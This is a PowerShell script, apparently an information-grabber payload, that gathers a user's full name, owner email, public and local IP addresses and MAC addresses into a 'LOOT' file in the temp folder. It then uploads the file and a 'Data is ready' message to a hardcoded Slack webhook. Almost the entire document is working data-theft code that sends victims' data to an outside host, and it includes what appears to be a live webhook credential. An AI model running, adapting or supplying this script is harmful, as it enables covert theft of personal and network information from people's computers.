$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"

#------------------------------------------------------------------------------------------------------------------------------------
# URL : https://tinyurl.com/grabber3

function Get-FullName {

    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
    catch {
        Write-Error "No name was detected"
        return $env:UserName
    }

    return $fullName 
}

$fullName = Get-FullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-Email {
    
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    }
    catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }        
}

$email = Get-Email

#------------------------------------------------------------------------------------------------------------------------------------

try {
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
}
catch {
    $computerPubIP = "Error getting Public IP"
}

$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*", "*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String

$MAC = Get-NetAdapter -Name "*Ethernet*", "*Wi-Fi*" | Select-Object Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------

$output = @"
Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------
Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC
"@

$output > $FileName

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Slack {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$false)]
        [string]$text,
        [parameter(Position=1, Mandatory=$false)]
        [string]$file
    )

    $webhookUrl = "https://hooks.slack.com/services/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"  # Slack webhook URL 설정

    $payload = @{
        'text' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'application/json' -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)) {
        $fileBytes = [System.IO.File]::ReadAllBytes($file)
        $fileName = [System.IO.Path]::GetFileName($file)

        Invoke-RestMethod -Uri "$webhookUrl/files.upload" -Method Post -InFile $file -ContentType 'multipart/form-data' -Headers @{ "filename" = $fileName }
    }
}

# ...

if (-not [string]::IsNullOrEmpty($dc)) {
    Upload-Slack -file "$FileName" -text "Data is ready"  # Slack 메시지 전송
}
